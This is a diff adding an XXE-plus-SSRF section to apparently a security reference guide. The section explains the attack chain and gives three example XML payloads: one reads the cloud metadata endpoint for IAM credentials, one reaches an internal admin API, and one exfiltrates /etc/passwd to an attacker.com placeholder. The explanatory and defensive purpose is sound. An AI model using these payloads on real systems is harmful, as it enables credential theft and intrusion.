@@ -1083,3 +1083,47 @@
       ```
   4. **Remote Code Execution (RCE)**:
     - In some cases, XXE can lead to RCE if the XML parser supports dangerous features (e.g., PHP expect module).
+
+
+### 2.XXE+SSRF
+
+  - Combining *XXE (XML External Entity)* and *SSRF (Server-Side Request Forgery)* can lead to powerful attacks where an attacker leverages XXE to trigger SSRF.
+  - This allows the attacker to make the server perform unauthorized requests to internal or external systems, potentially accessing sensitive data or exploiting internal services.
+
+
+#### How XXE and SSRF Work Together:
+  1. **XXE for SSRF**:
+    - An attacker injects malicious XML with an external entity that references an internal or external URL.
+    - The XML parser resolves the entity and makes a request to the specified URL.
+
+  2. **Impact**:
+    - Access to internal services (e.g., databases, APIs).
+    - Data exfiltration (e.g., fetching sensitive files or metadata).
+    - Exploitation of internal systems (e.g., cloud metadata services).
+
+#### Example Attack Scenario:
+  1. **Exploiting Cloud Metadata Services**:
+    - In cloud environments (e.g., AWS, Azure), metadata services (e.g., AWS EC2 metadata service at `http://169.254.169.254`) can be accessed to retrieve sensitive information like IAM credentials.
+    - Example XXE Payload:
+      ```xml
+      <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
+      <foo>&xxe;</foo>
+      ```
+    - The server makes a request to the metadata service and returns the response.
+
+  2. **Accessing Internal APIs**:
+    - An attacker can use XXE to access internal APIs that are not exposed to the public.
+    - Example XXE Payload:
+      ```xml
+      <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal-api/admin"> ]>
+      <foo>&xxe;</foo>
+      ```
+
+  3. **Exfiltrating Data**:
+    - An attacker can exfiltrate data by making the server send requests to an attacker-controlled server.
+    - Example XXE Payload:
+      ```xml
+      <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker.com/?data=file:///etc/passwd"> ]>
+      <foo>&xxe;</foo>
+      ```
+
